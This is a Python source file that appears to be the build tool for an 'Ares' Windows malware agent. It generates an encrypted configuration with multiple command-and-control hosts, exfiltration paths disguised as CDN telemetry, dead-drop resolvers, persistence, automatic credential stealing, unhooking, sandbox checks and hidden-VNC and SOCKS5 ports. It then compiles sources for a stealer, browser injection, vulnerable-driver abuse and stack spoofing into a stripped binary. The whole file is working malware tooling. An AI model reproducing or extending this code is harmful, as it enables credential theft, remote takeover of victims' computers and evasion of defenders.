def gen_config(c2_hosts, c2_port, campaign, xor_key, sleep_ms, jitter,
               kill_days, auto_persist, auto_steal, use_https,
               dead_drop_url1="", dead_drop_url2=""):
    """Generate ares_config.h for multi-host C2 failover."""
    kill_ts = int(time.time()) + kill_days * 86400
    compile_ts = str(int(time.time()))
    proto = "HTTPS" if use_https else "HTTP"
    cid = hashlib.md5(campaign.encode()).hexdigest()[:12]

    # Split comma-separated hosts
    hosts = [h.strip() for h in c2_hosts.split(',') if h.strip()]
    if not hosts:
        hosts = ['127.0.0.1']

    # --- XOR encrypted host entries (legacy fallback) ---
    host_entries = []
    for i, host in enumerate(hosts):
        enc = xor_encode(host, xor_key)
        host_entries.append(f"static const BYTE CFG_C2_{i}[] = {fmt_bytes(enc)};")
        host_entries.append(f"#define CFG_C2_{i}_LEN {len(host)}")

    decode_lines = []
    for i in range(len(hosts)):
        decode_lines.append(f"    _xd((s)->config.c2_endpoints[{i}], CFG_C2_{i}, CFG_C2_{i}_LEN, CFG_XOR_KEY); \\")
    decode_lines.append(f"    (s)->config.c2_count = {len(hosts)}; \\")

    # --- AES-256-GCM encrypted host entries ---
    # v5.0 FIX C-13: Use truly random AES key instead of predictable SHA256(campaign+timestamp)
    aes_key_bytes = os.urandom(32)  # 256-bit CSPRNG key
    aes_host_entries = []
    aes_decode_lines = []
    aes_available = HAS_PYCRYPTODOME or HAS_CRYPTOGRAPHY

    if aes_available:
        # Concatenate all hosts with null separator for single-blob encryption
        all_hosts_str = '\x00'.join(hosts)
        plaintext = all_hosts_str.encode('utf-8')
        nonce, ct_tag = aes_gcm_encrypt(plaintext, aes_key_bytes)

        aes_host_entries.append(f"/* AES-256-GCM key: SHA256(campaign_id + compile_timestamp) */")
        aes_host_entries.append(f"static const BYTE CFG_AES_KEY[] = {fmt_bytes(aes_key_bytes)};")
        aes_host_entries.append(f"static const BYTE CFG_AES_NONCE[] = {fmt_bytes(nonce)};")
        aes_host_entries.append(f"static const BYTE CFG_C2_ENC[] = {fmt_bytes(ct_tag)};")
        aes_host_entries.append(f"#define CFG_C2_ENC_LEN {len(ct_tag)}")

        # AES decode macro: decrypt blob, split on \0 into endpoints
        aes_decode_lines.append(f"    BYTE _aes_buf[{len(plaintext) + 1}]; \\")
        aes_decode_lines.append(f"    if (Ares_AES_GCM_Decrypt(CFG_C2_ENC, CFG_C2_ENC_LEN, CFG_AES_KEY, CFG_AES_NONCE, _aes_buf)) {{ \\")
        aes_decode_lines.append(f"        int _hi = 0, _hp = 0; \\")
        aes_decode_lines.append(f"        for (DWORD _ai = 0; _ai <= {len(plaintext) - 1}; _ai++) {{ \\")
        aes_decode_lines.append(f"            if (_aes_buf[_ai] == 0 || _ai == {len(plaintext) - 1}) {{ \\")
        aes_decode_lines.append(f"                int _el = (_aes_buf[_ai] == 0) ? (int)(_ai - _hp) : (int)(_ai - _hp + 1); \\")
        aes_decode_lines.append(f"                memcpy((s)->config.c2_endpoints[_hi], _aes_buf + _hp, _el); \\")
        aes_decode_lines.append(f"                (s)->config.c2_endpoints[_hi][_el] = '\\0'; \\")
        aes_decode_lines.append(f"                _hi++; _hp = (int)_ai + 1; \\")
        aes_decode_lines.append(f"            }} \\")
        aes_decode_lines.append(f"        }} \\")
        aes_decode_lines.append(f"        (s)->config.c2_count = _hi; \\")
        aes_decode_lines.append(f"    }} \\")
    else:
        print("  [!] WARNING: No AES library (pycryptodome/cryptography) â€” AES config disabled")

    # --- XOR encrypted API path entries ---
    # Disguised paths that CF Worker maps to real C2 endpoints
    path_register = "/cdn/v2/telemetry"
    path_beacon   = "/cdn/v2/heartbeat"
    path_result   = "/cdn/v2/analytics"
    path_exfil    = "/cdn/v2/events"

    path_entries = []
    for name, path in [("REGISTER", path_register), ("BEACON", path_beacon),
                        ("RESULT", path_result), ("EXFIL", path_exfil)]:
        enc = xor_encode(path, xor_key)
        path_entries.append(f"static const BYTE CFG_PATH_{name}[] = {fmt_bytes(enc)};")
        path_entries.append(f"#define CFG_PATH_{name}_LEN {len(path)}")

    cfg = f'''/*
 *  ARES AGENT -- Campaign Configuration (v3.2)
 *  Campaign:  {campaign}
 *  Generated: {time.strftime("%Y-%m-%d %H:%M")}
 *  C2:        {" | ".join(f"{h}:{c2_port}" for h in hosts)} ({proto})
 *  XOR Key:   0x{xor_key:02X}
 */
#ifndef ARES_CONFIG_H
#define ARES_CONFIG_H
#include <windows.h>

#define CFG_CAMPAIGN_ID       "{cid}"
#define CFG_CAMPAIGN_NAME     "{campaign}"
#define CFG_XOR_KEY           0x{xor_key:02X}
#define STR_ENC_KEY           0x{xor_key:02X}  /* W-3: compile-time string encryption key */

#define CFG_SLEEP_MS          {sleep_ms}
#define CFG_JITTER_PCT        {jitter}
#define CFG_KILL_DATE_TS      {kill_ts}

#define CFG_C2_PORT           {c2_port}
#define CFG_C2_COUNT          {len(hosts)}
#define CFG_SOCKS5_PORT       {random.randint(10000, 60000)}
#define CFG_HVNC_PORT         {random.randint(10000, 60000)}

#define CFG_AUTO_PERSIST      {1 if auto_persist else 0}
#define CFG_PERSIST_METHOD    "schtask"
#define CFG_AUTO_STEAL        {1 if auto_steal else 0}
#define CFG_AUTO_UNHOOK       1
#define CFG_SANDBOX_CHECK     1

#define CFG_USE_AES           1  /* v3.9: AES-256-GCM config encryption */

/* --- XOR-encoded path configs --- */
{chr(10).join(path_entries)}

/* --- XOR-encoded hosts (fallback when CFG_USE_AES is not defined) --- */
#ifndef CFG_USE_AES
{chr(10).join(host_entries)}
#endif

/* --- AES-256-GCM encrypted hosts (primary) --- */
#ifdef CFG_USE_AES
{chr(10).join(aes_host_entries) if aes_available else "/* AES library not available at build time */"}
#endif

#define CFG_USE_HTTP          {0 if use_https else 1}

/* --- Dead Drop Resolver (fallback C2 if primary CF Worker down) --- */
#define CFG_DEAD_DROP_ENABLED       {1 if (dead_drop_url1 or dead_drop_url2) else 0}
#define CFG_DEAD_DROP_URL_1         "{dead_drop_url1}"
#define CFG_DEAD_DROP_URL_2         "{dead_drop_url2}"
#define CFG_DEAD_DROP_MARKER_START  "{{{{"
#define CFG_DEAD_DROP_MARKER_END    "}}}}"
#define CFG_TLS_INSECURE      0  /* v3.2: 0=verify certs (production), 1=ignore (dev only) */

#ifdef CFG_USE_AES
#define ARES_DECODE_CONFIG(s) do {{ \\
{chr(10).join(aes_decode_lines) if aes_available else "    (s)->config.c2_count = 0; \\"}
    _xd((s)->config.path_register, CFG_PATH_REGISTER, CFG_PATH_REGISTER_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_beacon, CFG_PATH_BEACON, CFG_PATH_BEACON_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_result, CFG_PATH_RESULT, CFG_PATH_RESULT_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_exfil, CFG_PATH_EXFIL, CFG_PATH_EXFIL_LEN, CFG_XOR_KEY); \\
}} while(0)
#else
#define ARES_DECODE_CONFIG(s) do {{ \\
{chr(10).join(decode_lines)}
    _xd((s)->config.path_register, CFG_PATH_REGISTER, CFG_PATH_REGISTER_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_beacon, CFG_PATH_BEACON, CFG_PATH_BEACON_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_result, CFG_PATH_RESULT, CFG_PATH_RESULT_LEN, CFG_XOR_KEY); \\
    _xd((s)->config.path_exfil, CFG_PATH_EXFIL, CFG_PATH_EXFIL_LEN, CFG_XOR_KEY); \\
}} while(0)
#endif

#endif
'''
    return cfg, path_register, path_beacon, path_result, path_exfil

def compile_agent(output_name):
    os.makedirs(BUILD_DIR, exist_ok=True)
    out = os.path.join(BUILD_DIR, output_name)
    srcs = [
        "agent/native/main.c", "agent/native/core.c", "agent/native/syscall.c",
        "agent/native/stealer.c", "agent/native/chrome_v20.c",
        "agent/native/chrome_inject.c", "agent/native/socks5.c",
        "agent/native/hvnc.c", "agent/native/inject.c", "agent/native/persist.c",
        "agent/native/byovd.c", "agent/native/eprocess.c",
        "agent/native/bof_loader.c", "agent/native/domain_front.c",
        "agent/native/stack_spoof.c", "agent/native/cap_loader.c",
        "agent/native/dead_drop.c",
    ]
    libs = "-lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32 -lcrypt32 -lole32 -loleaut32 -lwinhttp -lbcrypt -liphlpapi -ldbghelp -lshlwapi -lntdll"
    # v3.2: Added -fno-asynchronous-unwind-tables for smaller binary
    cmd = (
        f'gcc -Wall -DARES_RELEASE -O2 -s -fno-ident '
        f'-fno-asynchronous-unwind-tables '
        f'-Wno-format-truncation -Wno-stringop-truncation '
        f'-Wno-unused-variable -Wno-unused-function '
        f'-Wno-unused-but-set-variable -Wno-cpp -Wno-unknown-pragmas '
        f'-Wno-format -Wno-incompatible-pointer-types -Wno-misleading-indentation '
        f'-Wl,--stack,4194304 -mwindows -I. '
        f'-o "{out}" {" ".join(srcs)} {libs}'
    )
    print("  [*] Compiling...")
    r = subprocess.run(shlex.split(cmd), shell=False, cwd=SCRIPT_DIR, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"  [!] COMPILE FAILED:\n{r.stderr[:1000]}")
        return None
    size = os.path.getsize(out)
    print(f"  [+] Built: {output_name} ({size:,} bytes)")
    return out

